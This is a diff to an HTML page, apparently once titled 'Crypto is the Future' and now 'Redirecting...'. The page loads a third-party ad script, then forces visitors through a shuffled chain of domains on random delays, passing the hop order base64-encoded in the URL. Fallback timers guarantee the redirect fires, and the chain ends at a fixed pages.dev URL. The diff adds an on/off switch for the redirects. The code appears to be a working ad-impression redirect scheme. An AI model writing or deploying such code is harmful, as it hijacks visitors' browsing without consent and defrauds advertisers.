@@ -2,8 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Crypto is the Future 💰</title>
-
+<title>Redirecting...</title>
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-1R5CE8315F"></script>
 <script>
@@ -13,7 +12,6 @@
 
   gtag('config', 'G-1R5CE8315F');
 </script>
-
 <style>
   body {
     background:#0a0a0a;
@@ -48,6 +46,12 @@
   }
 </style>
 
+<!-- ================= REDIRECTION CONTROL ================= -->
+<script>
+  const REDIRECTION_ENABLED = true;  // change to false to disable redirect
+</script>
+<!-- ======================================================= -->
+
 <!-- AD SCRIPT -->
 <script id="AdsCoreLoader"
 src="https://sads.adsboosters.xyz/ffc8b614d688665892a7071a2a3dc5f2.js"
@@ -64,9 +68,9 @@ let domains = [
 
 // REMOVE CURRENT DOMAIN
 let current = window.location.origin + "/";
-domains = domains.filter(d => d !== current); // remain only 3
+domains = domains.filter(d => d !== current);
 
-// Shuffle function
+// Shuffle
 function shuffle(array) {
     for (let i = array.length - 1; i > 0; i--) {
         const j = Math.floor(Math.random() * (i + 1));
@@ -75,56 +79,49 @@ function shuffle(array) {
     return array;
 }
 
-// URL Params
+// Params
 let params = new URLSearchParams(window.location.search);
 let orderParam = params.get("order");
 let index = parseInt(params.get("index")) || 0;
 
-// Decode or Generate Order
-let order;
-if (orderParam) {
-    try {
-        order = atob(orderParam).split(",");
-        if (!order || !order.length) order = shuffle([...domains]);
-    } catch(e) {
-        order = shuffle([...domains]);
-    }
-} else {
-    order = shuffle([...domains]);
-}
+let order = orderParam ? atob(orderParam).split(",") : shuffle([...domains]);
 
-// Final URL
+// Final page
 const finalUrl = "https://testss-3c9.pages.dev/";
 
-// Delay 5–7 seconds
+// Delay
 function delay() {
     return 5000 + Math.floor(Math.random() * 2000);
 }
 
 // Redirect function
 function doRedirect() {
+    if (!REDIRECTION_ENABLED) return;  // stop if disabled
+
     if (window.redirected) return;
     window.redirected = true;
 
     setTimeout(() => {
-        if (index < order.length) {
+        if (index < order.length - 1) {
+            index++;
             let encoded = btoa(order.join(","));
-            window.location.href = order[index] + "?order=" + encoded + "&index=" + (index + 1);
+            window.location.href = order[index] + "?order=" + encoded + "&index=" + index;
         } else {
             window.location.href = finalUrl;
         }
     }, delay());
 }
 
-// AD Script triggers redirect
+// AD SCRIPT EVENTS
 const adScript = document.getElementById("AdsCoreLoader");
 if (adScript) {
     adScript.onload = () => doRedirect();
     adScript.onerror = () => doRedirect();
 }
 
-// Fallbacks
+// FallBack
 setTimeout(() => { if (!window.redirected) doRedirect(); }, 4000);
+
 document.addEventListener("DOMContentLoaded", () => {
     setTimeout(() => { if (!window.redirected) doRedirect(); }, 3000);
 });
